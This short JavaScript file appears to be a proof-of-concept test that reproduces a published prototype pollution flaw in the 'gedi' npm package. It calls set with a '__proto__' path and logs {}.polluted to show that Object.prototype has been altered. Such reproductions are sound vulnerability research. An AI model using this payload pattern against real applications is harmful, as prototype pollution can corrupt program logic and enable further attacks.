// //https://snyk.io/vuln/SNYK-JS-GEDI-598803
// test("prototype pollution in gedi", () => {
console.log({}.polluted);

  const gedi = require("gedi");
  gedi().set("[__proto__/polluted]", "yes");

console.log({}.polluted);
// });
